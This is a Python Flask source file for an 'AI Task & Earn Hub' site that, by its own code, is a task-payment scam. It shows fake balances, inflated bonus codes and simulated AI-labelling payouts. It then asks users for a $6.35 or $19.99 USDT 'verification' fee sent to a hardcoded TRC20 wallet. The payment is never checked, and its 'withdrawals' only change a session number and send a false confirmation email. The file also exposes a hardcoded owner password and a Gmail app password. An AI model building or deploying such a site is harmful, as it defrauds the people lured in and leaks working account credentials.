from flask import Flask, render_template_string, request, redirect, url_for, session
from datetime import datetime
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)
app.secret_key = 'super_secret_fun_key'

# Owner Account Setup
OWNER_EMAIL = "clifjoseph21@gmail.com"
OWNER_PASS = "2prK9hh#"

# 30 Unique Bonus Codes (All under $8,500)
BONUS_CODES = {
    "ZYD150": 934.00,
    "CZ1800": 3000.00,
    "USA": 8000.00,
    "VIP100": 100.00,
    "PRO500": 500.00,
    "MEGA750": 750.00,
    "START50": 50.00,
    "BONUS200": 200.00,
    "TRON1000": 1000.00,
    "LUCKY250": 250.00,
    "ALPHA400": 400.00,
    "BETA600": 600.00,
    "GIGA1200": 1200.00,
    "ULTRA1500": 1500.00,
    "PRIME2000": 2000.00,
    "ELITE2500": 2500.00,
    "CHAMP3500": 3500.00,
    "BOSS4000": 4000.00,
    "KING4500": 4500.00,
    "ROYAL5000": 5000.00,
    "TITAN5500": 5500.00,
    "CYBER6000": 6000.00,
    "SOLAR6500": 6500.00,
    "LUNAR7000": 7000.00,
    "ASTRO7500": 7500.00,
    "APEX8000": 8000.00,
    "ZENITH8500": 8499.00,
    "FAST10": 10.00,
    "QUICK25": 25.00,
    "NINJA333": 333.00
}

# Task Catalog
TASKS_DB = [
    {"id": 1, "name": "Standard AI Data Tagging", "type": "Standard", "payout": 5.00, "desc": "Categorize basic text metadata for LLM datasets."},
    {"id": 2, "name": "Standard Image Bounding Box", "type": "Standard", "payout": 8.50, "desc": "Outline vehicles and pedestrians for computer vision."},
    {"id": 3, "name": "Pro Deepfake Image Auditing", "type": "Pro", "payout": 50.00, "desc": "Analyze high-res GAN outputs for artifact anomalies."},
    {"id": 4, "name": "Pro Neural Network Code Review", "type": "Pro", "payout": 64.20, "desc": "Review PyTorch optimization scripts for memory leaks."},
    {"id": 5, "name": "Pro LLM Safety Red-Teaming", "type": "Pro", "payout": 76.00, "desc": "Stress test generative models against jailbreak prompts."}
]

def send_real_email(to_email, subject, body):
    """Optional real email sender via Gmail SMTP. Falls back safely if not configured."""
    sender_email = "clifjoseph21@gmail.com"
    sender_password = "fkzb ncyf frza ishd" # Replace with a Gmail App Password if testing real sending
    try:
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender_email
        msg['To'] = to_email
        
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Email Dispatch Simulation (Logged): To {to_email} | {subject}")

@app.route('/')
def index():
    if 'user' in session:
        return redirect(url_for('dashboard'))
    return render_template_string(INDEX_HTML)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    if email == OWNER_EMAIL and password == OWNER_PASS:
        session['user'] = email
        session['balance'] = 507890.00
        session['is_owner'] = True
        session['verified'] = True
        session['activated'] = True
        session['redeemed_codes'] = []
        session['completed_tasks_today'] = 0
        session['history'] = []
        return redirect(url_for('dashboard'))
    
    session['user'] = email
    session['balance'] = 0.00
    session['is_owner'] = False
    session['verified'] = False
    session['activated'] = False
    session['redeemed_codes'] = []
    session['completed_tasks_today'] = 0
    session['history'] = []
    
    # Send verification email simulation
    send_real_email(email, "Verify Your Account - AI Task Hub", "Welcome! Please verify your email to unlock your workspace.")
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('index'))
    
    max_tasks = 5 if (session.get('verified') or session.get('is_owner')) else 2
    return render_template_string(DASHBOARD_HTML, 
                                  user=session.get('user'), 
                                  balance=session.get('balance', 0.00),
                                  is_owner=session.get('is_owner', False),
                                  verified=session.get('verified', False),
                                  activated=session.get('activated', False),
                                  tasks=TASKS_DB,
                                  history=session.get('history', []),
                                  completed_today=session.get('completed_tasks_today', 0),
                                  max_tasks=max_tasks)

@app.route('/apply_bonus', methods=['POST'])
def apply_bonus():
    code = request.form.get('code', '').strip().upper()
    redeemed = session.get('redeemed_codes', [])
    
    if code in BONUS_CODES and code not in redeemed:
        amount = BONUS_CODES[code]
        session['balance'] = session.get('balance', 0.00) + amount
        redeemed.append(code)
        session['redeemed_codes'] = redeemed
        session['success_msg'] = f"Successfully redeemed bonus code {code} for +${amount:.2f}!"
    elif code in redeemed:
        session['success_msg'] = "Error: This bonus code has already been redeemed once on your account."
    else:
        session['success_msg'] = "Error: Invalid bonus code."
    return redirect(url_for('dashboard'))

@app.route('/pay_activation', methods=['POST'])
def pay_activation():
    # User paid verification fee ($6.35 or $19.99 gateway)
    session['activated'] = True
    session['verified'] = True
    session['success_msg'] = "Payment confirmed! All AI Tasks and full withdrawal features are now unlocked."
    return redirect(url_for('dashboard'))

@app.route('/do_task/<int:task_id>')
def do_task(task_id):
    if not session.get('activated') and not session.get('is_owner'):
        return redirect(url_for('dashboard'))
    
    max_tasks = 5 if (session.get('verified') or session.get('is_owner')) else 2
    completed = session.get('completed_tasks_today', 0)
    
    if completed >= max_tasks:
        session['success_msg'] = f"Daily task limit reached ({max_tasks} tasks/day). Upgrade verification for higher limits."
        return redirect(url_for('dashboard'))
    
    selected_task = next((t for t in TASKS_DB if t['id'] == task_id), None)
    if selected_task:
        payout = selected_task['payout']
        session['balance'] = session.get('balance', 0.00) + payout
        session['completed_tasks_today'] = completed + 1
        session['history'].insert(0, f"Completed Task: {selected_task['name']} (+${payout:.2f})")
        session['success_msg'] = f"Task completed successfully! Earned ${payout:.2f}"
    
    return redirect(url_for('dashboard'))

@app.route('/request_withdrawal', methods=['POST'])
def request_withdrawal():
    if not session.get('is_owner') and not session.get('verified'):
        return redirect(url_for('verify_wall'))
    
    amount = float(request.form.get('amount', 0))
    if amount <= session.get('balance', 0):
        session['balance'] -= amount
        session['history'].insert(0, f"Withdrawal: -${amount:.2f} to TRC20 Wallet")
        send_real_email(session.get('user'), "Withdrawal Confirmation", f"Your withdrawal request of ${amount:.2f} has been successfully processed.")
        session['success_msg'] = f"Withdrawal of ${amount:.2f} successful! Confirmation email sent."
    else:
        session['success_msg'] = "Error: Insufficient account balance."
    return redirect(url_for('dashboard'))

@app.route('/verify_wall')
def verify_wall():
    return render_template_string(VERIFY_HTML)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# --- HTML TEMPLATES ---

INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AI Task Hub Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-950 text-white flex items-center justify-center h-screen">
    <div class="bg-gray-900 p-8 rounded-2xl shadow-2xl w-96 border border-gray-800">
        <h2 class="text-2xl font-black mb-2 text-center text-green-400">AI Task & Earn Hub</h2>
        <p class="text-xs text-gray-400 text-center mb-6">Train cutting-edge AI models and earn crypto.</p>
        <form action="/login" method="POST" class="space-y-4">
            <div>
                <label class="block text-xs text-gray-400 mb-1 font-semibold uppercase">Email Address</label>
                <input type="email" name="email" required class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-white focus:outline-none focus:border-green-500 text-sm">
            </div>
            <div>
                <label class="block text-xs text-gray-400 mb-1 font-semibold uppercase">Password</label>
                <input type="password" name="password" required class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-white focus:outline-none focus:border-green-500 text-sm">
            </div>
            <button type="submit" class="w-full bg-green-600 hover:bg-green-500 font-bold p-2.5 rounded-lg transition text-sm">Sign In / Register</button>
        </form>
    </div>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Dashboard - AI Task Hub</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-950 text-white min-h-screen p-6">
    <div class="max-w-5xl mx-auto space-y-6">
        <!-- Top Nav -->
        <div class="flex justify-between items-center bg-gray-900 p-4 rounded-xl border border-gray-800">
            <div>
                <p class="text-xs text-gray-400">Logged in as: <span class="text-green-400 font-mono font-bold">{{ user }}</span></p>
                {% if is_owner %}<span class="bg-red-600 text-[10px] px-2 py-0.5 rounded font-black tracking-wider uppercase mt-1 inline-block">SYSTEM OWNER</span>{% endif %}
            </div>
            <a href="/logout" class="bg-red-900/30 text-red-400 border border-red-800/50 px-3 py-1.5 rounded-lg hover:bg-red-900/50 text-xs font-semibold">Logout</a>
        </div>

        {% if session.get('success_msg') %}
        <div class="bg-emerald-950/80 border border-emerald-500 text-emerald-200 p-4 rounded-xl text-sm font-medium flex justify-between items-center">
            <span>{{ session.pop('success_msg') }}</span>
        </div>
        {% endif %}

        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
            <!-- Balance Card -->
            <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 flex flex-col justify-between">
                <div>
                    <h3 class="text-gray-400 text-xs font-bold uppercase tracking-wider">Available Balance</h3>
                    <p class="text-3xl font-black text-green-400 mt-2">${{ "%.2f"|format(balance) }}</p>
                    <p class="text-xs text-gray-500 mt-1">Daily Limit: {{ completed_today }} / {{ max_tasks }} tasks completed</p>
                </div>
                <div class="mt-6 pt-4 border-t border-gray-800 space-y-3">
                    <form action="/request_withdrawal" method="POST" class="flex gap-2">
                        <input type="number" step="0.01" name="amount" placeholder="Amount ($)" required class="bg-gray-950 border border-gray-800 rounded-lg p-2 text-white w-full text-xs">
                        <button type="submit" class="bg-blue-600 hover:bg-blue-500 px-4 py-2 rounded-lg font-bold text-xs whitespace-nowrap">Withdraw</button>
                    </form>
                </div>
            </div>

            <!-- Bonus Codes Card -->
            <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 space-y-4">
                <h3 class="font-bold text-xs uppercase tracking-wider text-gray-400">Redeem Promo Code</h3>
                <form action="/apply_bonus" method="POST" class="flex gap-2">
                    <input type="text" name="code" placeholder="e.g. ZYD150, USA, CZ1800" required class="bg-gray-950 border border-gray-800 rounded-lg p-2 text-white w-full text-xs uppercase font-mono">
                    <button type="submit" class="bg-purple-600 hover:bg-purple-500 px-4 py-2 rounded-lg font-bold text-xs">Apply</button>
                </form>
                <p class="text-[11px] text-gray-500 leading-relaxed">Codes like <code class="text-purple-400">ZYD150</code>, <code class="text-purple-400">USA</code>, and <code class="text-purple-400">CZ1800</code> can be redeemed once per account.</p>
            </div>

            <!-- Activation / Status Card -->
            <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 space-y-3 flex flex-col justify-between">
                <div>
                    <h3 class="font-bold text-xs uppercase tracking-wider text-gray-400">Account Access</h3>
                    <div class="mt-2">
                        {% if activated or is_owner %}
                            <span class="inline-block bg-green-500/10 text-green-400 border border-green-500/30 px-3 py-1 rounded-full text-xs font-bold">Fully Activated & Verified</span>
                        {% else %}
                            <span class="inline-block bg-amber-500/10 text-amber-400 border border-amber-500/30 px-3 py-1 rounded-full text-xs font-bold">Activation Required</span>
                        {% endif %}
                    </div>
                </div>
                {% if not activated and not is_owner %}
                <form action="/pay_activation" method="POST">
                    <button type="submit" class="w-full bg-amber-600 hover:bg-amber-500 p-2 rounded-lg font-bold text-xs mt-2">Activate via TRC20 ($6.35)</button>
                </form>
                {% endif %}
            </div>
        </div>

        <!-- AI Tasks Section -->
        <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 space-y-4">
            <div class="flex justify-between items-center">
                <h3 class="font-bold text-sm uppercase tracking-wider text-gray-300">Available AI Training Modules</h3>
                <span class="text-xs text-gray-500">Standard & Pro Tasks</span>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {% for t in tasks %}
                <div class="bg-gray-950 p-4 rounded-xl border border-gray-800 flex flex-col justify-between space-y-3">
                    <div>
                        <div class="flex justify-between items-start">
                            <span class="text-xs font-bold px-2 py-0.5 rounded {% if t.type == 'Pro' %}bg-amber-500/10 text-amber-400 border border-amber-500/30{% else %}bg-blue-500/10 text-blue-400 border border-blue-500/30{% endif %}">{{ t.type }}</span>
                            <span class="text-green-400 font-black text-base">+${{ "%.2f"|format(t.payout) }}</span>
                        </div>
                        <h4 class="font-bold text-sm mt-2 text-white">{{ t.name }}</h4>
                        <p class="text-xs text-gray-400 mt-1">{{ t.desc }}</p>
                    </div>
                    
                    {% if activated or is_owner %}
                        <a href="/do_task/{{ t.id }}" class="block text-center bg-green-600 hover:bg-green-500 text-white font-bold py-2 rounded-lg text-xs transition">Execute Task</a>
                    {% else %}
                        <button disabled class="w-full bg-gray-800 text-gray-500 font-bold py-2 rounded-lg text-xs cursor-not-allowed">Locked (Activation Needed)</button>
                    {% endif %}
                </div>
                {% endfor %}
            </div>
        </div>

        <!-- User Guide Section -->
        <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 space-y-3">
            <h3 class="font-bold text-xs uppercase tracking-wider text-gray-400">Platform User Guide</h3>
            <ul class="text-xs text-gray-400 space-y-1.5 list-disc list-inside">
                <li><strong class="text-white">Activation:</strong> Pay the verification fee to unlock full access to Pro tasks and unlimited withdrawals.</li>
                <li><strong class="text-white">Daily Limits:</strong> Standard accounts can complete up to 2 tasks per day. Upgraded/Verified users can complete up to 5 tasks per day.</li>
                <li><strong class="text-white">Bonuses:</strong> Use exclusive promo codes once to instantly boost your wallet balance.</li>
                <li><strong class="text-white">Withdrawals:</strong> Withdrawals are processed instantly via TRC20 wallet address with email confirmations.</li>
            </ul>
        </div>

        <!-- Activity History -->
        <div class="bg-gray-900 p-6 rounded-xl border border-gray-800 space-y-3">
            <h3 class="font-bold text-xs uppercase tracking-wider text-gray-400">Activity & Transaction History</h3>
            {% if history %}
                <ul class="space-y-2 text-xs font-mono">
                {% for h in history %}
                    <li class="bg-gray-950 p-2.5 rounded border border-gray-800/80 text-gray-300 flex justify-between items-center">
                        <span>{{ h }}</span>
                        <span class="text-gray-500 text-[10px]">Just now</span>
                    </li>
                {% endfor %}
                </ul>
            {% else %}
                <p class="text-xs text-gray-500">No recent activity recorded yet.</p>
            {% endif %}
        </div>
    </div>
</body>
</html>
"""

VERIFY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verification Required</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-950 text-white flex items-center justify-center h-screen p-6">
    <div class="bg-gray-900 p-8 rounded-2xl shadow-2xl max-w-md w-full border border-gray-800 space-y-4">
        <h2 class="text-lg font-black text-amber-400">Identity Verification Required</h2>
        <p class="text-xs text-gray-300 leading-relaxed">To unlock full withdrawals and higher daily task limits, please send <strong class="text-white">$19.99 USDT (TRC20)</strong> to your designated address:</p>
        
        <div class="bg-gray-950 p-3 rounded-xl border border-gray-800 font-mono text-xs text-green-400 break-all select-all">
            THpVB1kmPGPuzP3W53j9i6KU2TYpkHtgXs
        </div>
        
        <form action="/pay_activation" method="POST" class="space-y-3 pt-2">
            <input type="text" placeholder="Paste TRC20 Transaction Hash (TXID)" required class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-xs text-white">
            <button type="submit" class="w-full bg-green-600 hover:bg-green-500 p-2.5 rounded-lg font-bold text-xs transition">Confirm Verification Payment</button>
        </form>
    </div>
</body>
</html>
"""

import os

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)